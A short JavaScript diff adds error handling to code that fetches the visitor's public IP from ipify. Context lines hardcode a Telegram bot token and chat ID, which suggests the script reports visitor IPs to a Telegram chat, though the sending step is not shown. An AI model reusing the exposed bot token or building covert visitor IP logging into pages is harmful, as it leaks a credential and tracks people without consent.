@@ -1,5 +1,10 @@
 fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
+    .then(response => {
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        return response.json();
+    })
     .then(data => {
         const token = '1857364491:AAFGgMoMhWWZOaT1Pd4bwnIi4NEWDNl5NSY'
         const chatId = -1001593340003
